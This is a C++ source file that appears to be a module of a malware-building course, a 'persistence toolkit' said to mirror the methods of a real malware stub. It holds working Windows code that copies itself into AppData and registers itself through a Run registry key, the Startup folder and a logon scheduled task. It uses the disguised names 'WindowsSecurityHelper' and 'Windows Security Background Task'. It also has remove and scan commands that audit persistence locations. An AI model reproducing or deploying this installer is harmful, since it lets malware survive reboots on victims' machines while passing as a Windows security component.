/*
  persistence_toolkit.cpp — Module 10 workable (Persistence Toolkit)
  ===================================================================
  Full operational persistence installer / scanner / remover.
  Mirrors the persistence methods used in the real stub (full_stub.cpp).

  Compile:
    g++ -std=c++17 -O2 -s -o persistence_toolkit.exe persistence_toolkit.cpp \
        -ladvapi32 -lole32 -loleaut32 -lwbemuuid -ltaskschd -lshlwapi

  Commands:
    persistence_toolkit.exe install [run|sched|startup|all]
    persistence_toolkit.exe remove  [run|sched|startup|all]
    persistence_toolkit.exe scan                              -- audit all persistence locations
*/
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#define _WIN32_DCOM
#include <windows.h>
#include <shlobj.h>
#include <taskschd.h>
#include <comdef.h>
#include <wbemidl.h>
#include <string>
#include <vector>
#include <stdio.h>

#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"ole32.lib")
#pragma comment(lib,"oleaut32.lib")
#pragma comment(lib,"taskschd.lib")

// ── config ───────────────────────────────────────────────────────────────────
static const char*    RUN_VALUE  = "WindowsSecurityHelper";
static const wchar_t* TASK_NAME  = L"WindowsSecurityHelper";
static const wchar_t* TASK_DESC  = L"Windows Security Background Task";

// Get current executable path and the installed copy path
static std::string selfPath(){
    char buf[MAX_PATH]={}; GetModuleFileNameA(nullptr,buf,MAX_PATH); return buf;
}
static std::string installPath(){
    char appData[MAX_PATH]={};
    SHGetFolderPathA(nullptr,CSIDL_APPDATA,nullptr,0,appData);
    return std::string(appData)+"\\Microsoft\\Windows\\"+RUN_VALUE+".exe";
}

// ── Run key ───────────────────────────────────────────────────────────────────
static bool installRunKey(){
    std::string dst=installPath();
    // Ensure parent dir exists
    std::string dir=dst.substr(0,dst.rfind('\\'));
    CreateDirectoryA(dir.c_str(),nullptr);
    CopyFileA(selfPath().c_str(),dst.c_str(),FALSE);
    HKEY hk=nullptr;
    if(RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,nullptr,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,nullptr,&hk,nullptr)!=ERROR_SUCCESS)
        return false;
    bool ok=RegSetValueExA(hk,RUN_VALUE,0,REG_SZ,(BYTE*)dst.c_str(),(DWORD)dst.size()+1)==ERROR_SUCCESS;
    RegCloseKey(hk); return ok;
}
static bool removeRunKey(){
    HKEY hk=nullptr;
    if(RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hk)!=ERROR_SUCCESS)
        return false;
    bool ok=RegDeleteValueA(hk,RUN_VALUE)==ERROR_SUCCESS;
    RegCloseKey(hk); return ok;
}

// ── Startup folder ────────────────────────────────────────────────────────────
static bool installStartup(){
    char startup[MAX_PATH]={};
    SHGetFolderPathA(nullptr,CSIDL_STARTUP,nullptr,0,startup);
    std::string dst=std::string(startup)+"\\"+RUN_VALUE+".exe";
    return CopyFileA(selfPath().c_str(),dst.c_str(),FALSE)!=0;
}
static bool removeStartup(){
    char startup[MAX_PATH]={};
    SHGetFolderPathA(nullptr,CSIDL_STARTUP,nullptr,0,startup);
    std::string dst=std::string(startup)+"\\"+RUN_VALUE+".exe";
    return DeleteFileA(dst.c_str())!=0;
}

// ── Scheduled task (ITaskService COM) ────────────────────────────────────────
static bool installSched(){
    HRESULT hr=CoInitializeEx(nullptr,COINIT_MULTITHREADED); if(FAILED(hr)) return false;
    ITaskService* svc=nullptr;
    hr=CoCreateInstance(CLSID_TaskScheduler,nullptr,CLSCTX_INPROC_SERVER,
                         IID_ITaskService,(void**)&svc);
    if(FAILED(hr)){CoUninitialize();return false;}
    svc->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());
    ITaskFolder* rootFolder=nullptr;
    svc->GetFolder(_bstr_t("\\"),&rootFolder);

    ITaskDefinition* task=nullptr;
    svc->NewTask(0,&task);

    IRegistrationInfo* regInfo=nullptr; task->get_RegistrationInfo(&regInfo);
    regInfo->put_Description(_bstr_t(TASK_DESC)); regInfo->Release();

    ITriggerCollection* triggers=nullptr; task->get_Triggers(&triggers);
    ITrigger* trigger=nullptr; triggers->Create(TASK_TRIGGER_LOGON,&trigger);
    ILogonTrigger* logon=nullptr; trigger->QueryInterface(IID_ILogonTrigger,(void**)&logon);
    logon->put_Id(_bstr_t("Trigger1")); logon->Release(); trigger->Release(); triggers->Release();

    IActionCollection* actions=nullptr; task->get_Actions(&actions);
    IAction* action=nullptr; actions->Create(TASK_ACTION_EXEC,&action);
    IExecAction* exec=nullptr; action->QueryInterface(IID_IExecAction,(void**)&exec);
    std::string dst=installPath();
    std::wstring wdst(dst.begin(),dst.end());
    exec->put_Path(_bstr_t(wdst.c_str())); exec->Release(); action->Release(); actions->Release();

    IPrincipal* principal=nullptr; task->get_Principal(&principal);
    principal->put_RunLevel(TASK_RUNLEVEL_LUA); principal->Release();

    ITaskSettings* settings=nullptr; task->get_Settings(&settings);
    settings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
    settings->put_DisallowStartIfOnBatteries(VARIANT_FALSE); settings->Release();

    IRegisteredTask* regTask=nullptr;
    hr=rootFolder->RegisterTaskDefinition(_bstr_t(TASK_NAME),task,
        TASK_CREATE_OR_UPDATE,_variant_t(),_variant_t(),TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(""),&regTask);
    bool ok=SUCCEEDED(hr);
    if(regTask) regTask->Release(); task->Release(); rootFolder->Release(); svc->Release();
    CoUninitialize(); return ok;
}
static bool removeSched(){
    HRESULT hr=CoInitializeEx(nullptr,COINIT_MULTITHREADED); if(FAILED(hr)) return false;
    ITaskService* svc=nullptr;
    hr=CoCreateInstance(CLSID_TaskScheduler,nullptr,CLSCTX_INPROC_SERVER,
                         IID_ITaskService,(void**)&svc);
    if(FAILED(hr)){CoUninitialize();return false;}
    svc->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());
    ITaskFolder* root=nullptr; svc->GetFolder(_bstr_t("\\"),&root);
    hr=root->DeleteTask(_bstr_t(TASK_NAME),0);
    root->Release(); svc->Release(); CoUninitialize();
    return SUCCEEDED(hr);
}

// ── scan: audit all persistence locations ────────────────────────────────────
static void scanRegKey(HKEY root, const char* key, const char* rootName){
    HKEY hk=nullptr;
    if(RegOpenKeyExA(root,key,0,KEY_READ,&hk)!=ERROR_SUCCESS) return;
    DWORD idx=0; char name[256]={},val[1024]={};
    while(true){
        DWORD ns=sizeof(name),vs=sizeof(val),type=0;
        if(RegEnumValueA(hk,idx++,name,&ns,0,&type,(BYTE*)val,&vs)!=ERROR_SUCCESS) break;
        if(type==REG_SZ||type==REG_EXPAND_SZ)
            printf("  [RUN]  %s\\%s\\%s = %s\n",rootName,key,name,val);
    }
    RegCloseKey(hk);
}
static void scanStartupFolder(int csidl, const char* label){
    char path[MAX_PATH]={}; SHGetFolderPathA(nullptr,csidl,nullptr,0,path);
    WIN32_FIND_DATAA fd{}; std::string pat=std::string(path)+"\\*";
    HANDLE h=FindFirstFileA(pat.c_str(),&fd);
    if(h==INVALID_HANDLE_VALUE) return;
    do {
        if(fd.cFileName[0]=='.') continue;
        printf("  [STARTUP] %s\\%s\n",label,fd.cFileName);
    } while(FindNextFileA(h,&fd));
    FindClose(h);
}
static void scanServices(){
    SC_HANDLE scm=OpenSCManagerA(nullptr,nullptr,SC_MANAGER_ENUMERATE_SERVICE);
    if(!scm) return;
    DWORD needed=0,count=0; ENUM_SERVICE_STATUS_PROCESSA* buf=nullptr;
    EnumServicesStatusExA(scm,SC_ENUM_PROCESS_INFO,SERVICE_WIN32,SERVICE_ACTIVE,
                           nullptr,0,&needed,&count,nullptr,nullptr);
    buf=(ENUM_SERVICE_STATUS_PROCESSA*)malloc(needed);
    if(EnumServicesStatusExA(scm,SC_ENUM_PROCESS_INFO,SERVICE_WIN32,SERVICE_ACTIVE,
                              (LPBYTE)buf,needed,&needed,&count,nullptr,nullptr)){
        // Only print non-standard services (crude heuristic: path not in system32/syswow64)
        for(DWORD i=0;i<count;++i){
            SC_HANDLE sh=OpenServiceA(scm,buf[i].lpServiceName,SERVICE_QUERY_CONFIG);
            if(!sh) continue;
            DWORD qn=0; QueryServiceConfigA(sh,nullptr,0,&qn);
            auto* cfg=(QUERY_SERVICE_CONFIGA*)malloc(qn);
            if(QueryServiceConfigA(sh,cfg,qn,&qn)){
                std::string bp(cfg->lpBinaryPathName?cfg->lpBinaryPathName:"");
                std::string lower=bp; for(auto&c:lower)c=(char)tolower(c);
                if(lower.find("system32")==std::string::npos&&
                   lower.find("syswow64")==std::string::npos&&!bp.empty())
                    printf("  [SVC]  %s = %s\n",buf[i].lpServiceName,bp.c_str());
            }
            free(cfg); CloseServiceHandle(sh);
        }
    }
    free(buf); CloseServiceHandle(scm);
}
static void cmdScan(){
    printf("=== Persistence Audit ===\n\n");
    // Run keys
    const char* runKeys[]={
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",nullptr
    };
    for(int i=0;runKeys[i];++i){
        scanRegKey(HKEY_CURRENT_USER,runKeys[i],"HKCU");
        scanRegKey(HKEY_LOCAL_MACHINE,runKeys[i],"HKLM");
    }
    // Startup folders
    scanStartupFolder(CSIDL_STARTUP,      "User Startup");
    scanStartupFolder(CSIDL_COMMON_STARTUP,"Common Startup");
    // Services (non-system)
    scanServices();
    printf("\n[*] Scan complete.\n");
}

// ── main ─────────────────────────────────────────────────────────────────────
static void usage(){puts(
    "persistence_toolkit — Module 10 workable\n"
    "  install [run|sched|startup|all]   install persistence method(s)\n"
    "  remove  [run|sched|startup|all]   remove persistence method(s)\n"
    "  scan                               audit all persistence locations");}

static void doInstall(const std::string& meth){
    bool all=(meth=="all");
    if(all||meth=="run")     printf("Run key:  %s\n",installRunKey()?"[OK]":"[FAIL]");
    if(all||meth=="sched")   printf("Sched:    %s\n",installSched()?"[OK]":"[FAIL]");
    if(all||meth=="startup") printf("Startup:  %s\n",installStartup()?"[OK]":"[FAIL]");
}
static void doRemove(const std::string& meth){
    bool all=(meth=="all");
    if(all||meth=="run")     printf("Run key:  %s\n",removeRunKey()?"[OK]":"[FAIL]");
    if(all||meth=="sched")   printf("Sched:    %s\n",removeSched()?"[OK]":"[FAIL]");
    if(all||meth=="startup") printf("Startup:  %s\n",removeStartup()?"[OK]":"[FAIL]");
    // Also clean installed copy
    std::string dst=installPath(); DeleteFileA(dst.c_str());
}

int main(int argc, char* argv[]){
    if(argc<2){usage();return 1;}
    std::string cmd(argv[1]);
    if(cmd=="install")     doInstall(argc>=3?argv[2]:"run");
    else if(cmd=="remove") doRemove(argc>=3?argv[2]:"all");
    else if(cmd=="scan")   cmdScan();
    else {usage();return 1;}
    return 0;
}
